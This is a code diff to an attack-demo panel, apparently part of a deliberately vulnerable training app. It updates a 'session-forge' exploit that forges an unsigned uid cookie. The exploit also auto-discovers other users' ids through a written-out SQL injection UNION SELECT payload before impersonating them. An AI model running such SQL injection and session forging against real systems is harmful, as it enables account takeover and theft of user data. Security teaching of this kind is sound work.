@@ -58,11 +58,32 @@ const ATTACKS: Attack[] = [
     id: "session-forge",
     title: "Broken auth — forge the session cookie",
     description:
-      "The session cookie is just  uid=<id>  with no signature, and it is not HttpOnly. Copy a real user id from the SQL injection dump above, paste it here, and the button sets the cookie and calls /api/auth/me as that user.",
-    defaultPayload: "00000000-0000-0000-0000-000000000000",
+      "The session cookie is just  uid=<id>  with no signature, and it is not HttpOnly. Leave the field blank to auto-discover another user id via SQL injection, or paste one. The button rewrites the cookie, calls /api/auth/me as that user, then restores your own cookie.",
+    defaultPayload: "",
     run: async (p) => {
-      document.cookie = `uid=${p}; Path=/; SameSite=None; Secure`;
-      return raw("GET", "/api/auth/me");
+      const original = document.cookie.match(/(?:^|; )uid=([^;]*)/)?.[1];
+      let id = p.trim();
+
+      if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(id)) {
+        const dump = await fetch(
+          `/api/notes/search?q=${encodeURIComponent(
+            "' UNION SELECT NULL, username, id::text, now(), now() FROM users --",
+          )}`,
+          { credentials: "include" },
+        )
+          .then((r) => r.json())
+          .catch(() => null);
+        const rows: Array<{ body: string }> = dump?.notes ?? [];
+        id = (rows.find((n) => n.body && n.body !== original) ?? rows[0])?.body ?? "";
+        if (!id) {
+          return { status: 0, body: "Could not enumerate users. Log in first, then retry." };
+        }
+      }
+
+      document.cookie = `uid=${id}; Path=/; SameSite=None; Secure`;
+      const result = await raw("GET", "/api/auth/me");
+      if (original) document.cookie = `uid=${original}; Path=/; SameSite=None; Secure`;
+      return result;
     },
   },
   {
